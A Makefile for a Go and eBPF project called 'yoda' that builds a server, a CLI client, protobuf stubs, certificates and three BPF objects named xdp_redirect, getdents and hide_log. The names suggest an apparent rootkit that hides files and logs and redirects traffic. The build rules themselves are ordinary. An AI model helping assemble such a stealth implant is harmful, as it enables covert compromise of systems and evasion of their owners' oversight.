## BPF build variables
BPF_CLANG ?= clang
BPF_CFLAGS ?= -O2 -g -target bpf -D__TARGET_ARCH_x86 -I/usr/include/ -I.
BPF_LDFLAGS ?=
## BPF sources
BPF_SRCS = bpf/xdp_redirect.c bpf/getdents.c bpf/hide_log.c
BPF_OBJS = internal/core/ebpf/obj/xdp_redirect.o internal/core/ebpf/obj/getdents.o internal/core/ebpf/obj/hide_log.o

## Go build variables
GO ?= go
YODA_BIN = yoda
CLI_BIN = yoda-client



.PHONY: all yoda cli bpf clean cert proto



all: proto bpf yoda cli
proto:
	protoc --go_out=. --go-grpc_out=. internal/core/proto/*

CERT_IP ?= 127.0.0.1

cert:
	$(GO) run tools/gen_certs.go $(CERT_IP)

yoda:
	cd cmd/server && $(GO) build -ldflags="-s -w" -o ../../bin/$(YODA_BIN)

cli:
	cd cmd/cli && $(GO) build -ldflags="-s -w" -o ../../bin/$(CLI_BIN)


bpf: $(BPF_OBJS)

internal/core/ebpf/obj/%.o: bpf/%.c
	$(BPF_CLANG) $(BPF_CFLAGS) -c $< -o $@

clean:
	rm -f $(BPF_OBJS) bin/$(YODA_BIN) bin/$(CLI_BIN)
